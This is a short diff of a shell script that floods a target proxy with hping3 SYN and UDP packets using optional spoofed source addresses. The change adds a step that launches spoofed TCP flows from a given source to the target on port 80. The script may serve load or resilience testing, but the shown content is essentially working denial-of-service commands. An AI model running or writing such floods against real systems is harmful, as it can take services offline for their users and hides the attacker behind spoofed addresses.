@@ -16,4 +16,8 @@ echo "attacking proxy ${TARGET} for ${DURATION}s"
 launch "hping3 SYN flood" hping3 ${spoof} -S --flood -p 80 "${TARGET}"
 launch "hping3 UDP flood" hping3 ${spoof} -2 --flood -p 80 "${TARGET}"
 
+if [ -n "${SPOOF_SOURCE}" ]; then
+  launch_spoofed_flows "${SPOOF_SOURCE}" "${TARGET}" 80 tcp
+fi
+
 finish
